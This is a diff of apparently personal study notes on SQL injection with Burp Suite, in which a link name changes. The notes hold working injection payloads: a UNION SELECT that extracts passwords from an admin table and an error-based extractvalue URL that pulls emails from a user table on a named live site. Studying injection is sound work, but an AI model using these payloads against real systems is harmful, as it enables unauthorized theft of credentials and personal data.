@@ -59,7 +59,7 @@ Knowing How To Work With Burp Suite
 	<mark style="background: #FF5582A6;">Point :</mark> 
 	when we delete the 0x7e to show the password as complete, the site loaded without any error)
 	(it doesn't have [[13-Double Query]], only the combined way with
-	[[2-Sql Injection (Basic)]] may work, in this way, we have found the name of the important table and the important columns, so we extract the information we want as follow :
+	[[02-Sql Injection (Basic)]] may work, in this way, we have found the name of the important table and the important columns, so we extract the information we want as follow :
 	- <mark style="background: #FFB86CA6;">union select 1,2,3,4,5,password,7,8,9 from admin--</mark> 
 
 12. http://stpbusiness.st/single.php?id_p=30%27%20and%20extractvalue(rand(),concat(0x7e,(select%20concat(email)%20from%20usuario%20limit%200,1)))--+
